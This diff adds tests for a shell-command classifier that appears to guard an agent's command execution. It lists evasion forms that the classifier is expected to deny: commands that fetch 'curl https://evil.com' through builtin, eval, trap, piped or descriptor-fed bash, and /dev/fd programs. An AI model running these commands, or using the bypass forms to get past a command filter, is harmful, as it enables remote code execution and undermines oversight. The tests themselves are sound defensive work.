@@ -1577,3 +1577,38 @@ describe('review 6: builtin as a prefix, a shell program read through a file des
       expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
   })
 })
+
+describe('review 7: builtin --, a shell reading stdin duplicated from another descriptor', () => {
+  const d = (c: string) => classify(c, 0, new Set(['download.geofabrik.de']), new Set())
+  it('1. builtin -- NAME runs NAME', () => {
+    for (const c of ["builtin -- eval 'curl https://evil.com'", "builtin -- trap 'curl https://evil.com' EXIT",
+      'builtin -- source <(echo curl https://evil.com)',
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
+    for (const c of ['builtin -- echo hi', 'builtin -- cd /tmp && ls', 'builtin cd /tmp', 'builtin echo hi', 'builtin read x'])
+      expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
+  })
+  it('2. a shell with no -c and no program file whose stdin is <&N denies, curl named or not', () => {
+    const fd3 = 'exec 3< <(echo curl https://evil.com); '
+    for (const c of [`${fd3}bash <&3`, `${fd3}bash 0<&3`, `${fd3}sh <&3`, `${fd3}bash -s <&3`, `${fd3}bash <& 3`,
+      `${fd3}bash -s foo <&3`, 'bash <&3', 'bash -xs foo <&4',
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
+    for (const c of ['bash <&3', 'bash 0<&3', 'sh <& 3', 'exec 3< x; bash -s <&3']) expect(d(c)).toMatchObject({ deny: true, reason: 'shell-stdin-dup' })
+    for (const c of ['bash script.sh <&3', 'bash <&-', 'bash script.sh 2>&1 <&3']) expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
+  })
+  it('3. a redirection or -s does not make a piped shell read a program file', () => {
+    for (const c of ['echo curl https://evil.com | bash 2>&1', 'echo curl https://evil.com | bash >/tmp/log',
+      'echo curl https://evil.com | bash -s foo', 'cat x.sh | bash -s -- arg',
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
+    for (const c of ['bash script.sh 2>&1', 'bash script.sh 2>&1 | tee log', 'git log | bash script.sh', 'bash -o pipefail script.sh',
+      'bash -s < script.sh', "sh -c 'echo hi' 2>&1",
+      // a quoted program file is a program file (measured on the fleet corpus), a quoted `<&3` is a file name
+      'bash "$SD/db02.sh" "SELECT 1" 2>&1', 'echo hi | bash "$SD/run.sh"', "bash 'x.sh' <&3", 'echo curl https://evil.com | bash "<&3"',
+    ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
+  })
+  it('4. a heredoc on the command does not let a /dev/fd/N program through', () => {
+    expect(d('exec 3< <(echo curl https://evil.com); bash /dev/fd/3 <<< "echo hi"')).toMatchObject({ deny: true, reason: 'shell-fd-program' })
+    expect(d("exec 3< <(echo curl https://evil.com); bash /dev/fd/3 <<'EOF'\necho hi\nEOF")).toMatchObject({ deny: true, reason: 'shell-fd-program' })
+    for (const c of ['bash /dev/stdin <<< "echo hi"', 'cat /dev/stdin', 'ls', 'git status', 'curl -s http://localhost:3420/api/agents'])
+      expect({ c, deny: d(c).deny }).toEqual({ c, deny: false })
+  })
+})
